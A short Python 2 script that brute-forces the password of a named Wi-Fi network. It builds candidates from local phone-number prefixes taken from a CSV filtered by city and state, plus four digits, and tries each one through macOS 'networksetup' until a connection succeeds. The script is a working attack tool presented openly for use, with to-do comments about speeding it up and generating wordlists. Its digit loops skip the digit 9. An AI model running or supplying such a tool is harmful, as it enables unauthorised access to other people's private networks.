import os
import subprocess
import csv
import argparse
 
# h/t https://bluembed.wordpress.com/2016/01/16/python-script-to-hack-wifi-networks-using-brutal-force/
# to do: asynchronous i/o or threading for speed?
# to do: use this script to generate a wordlist for Aircrack?
# to do: make sure the CSV has correct city names
# to do: input validation

#area = 'NA'
ssid = 'NA'
city = 'NA'
state = 'NA'
exchanges = []

parser = argparse.ArgumentParser(description='Enter your city and state and this script will brute force Wi-Fi passwords based on valid phone numbers.')
#parser.add_argument('-a', help='The NPA area code',required=False)
parser.add_argument('--ssid', help='SSID name',required=True)
parser.add_argument('-c', help='City name',required=True)
parser.add_argument('-s', help='State abbreviation',required=True)
args = parser.parse_args()

#area = args.a
ssid = args.ssid
city = args.c
state = args.s
city = city.upper()
state = state.upper()

#print "Your area code is %s." % area
#print "Your city is %s." % city
#print "Your state is %s." % state

#search_for = [area]
search_for = [city, state]

with open('phones.csv') as inf:
  reader = csv.reader(inf)
  for row in reader:
    if row[2] in city and row[3] in state:
      exchanges.append(row[1]+row[0])
  print "List of valid NPA/NXX numbers for %s, %s:" % (city, state)
  print exchanges

for i in exchanges:
  for y in range(0, 9):
    for z in range(0, 9):
      for l in range(0, 9):
        for m in range(0, 9):
          password=[i,y,z,l,m]
          str1 = ''.join(str(e)for e in password)
          print "Is the password %s?" % str1
          proc = subprocess.Popen(["networksetup", "-setairportnetwork","en0",ssid,str1],stdout=subprocess.PIPE)
          x=proc.stdout.readline()
          try:
            if (x[0]=='F'): # output generated if password is wrong is "False network password" so I take the first letter F and check it
              print("Nope.")
          except IndexError : # if password is correct there's no command reply hence no string to access it with x[0]
              print "Yup!"
              print "The password is %s." % str1
              exit()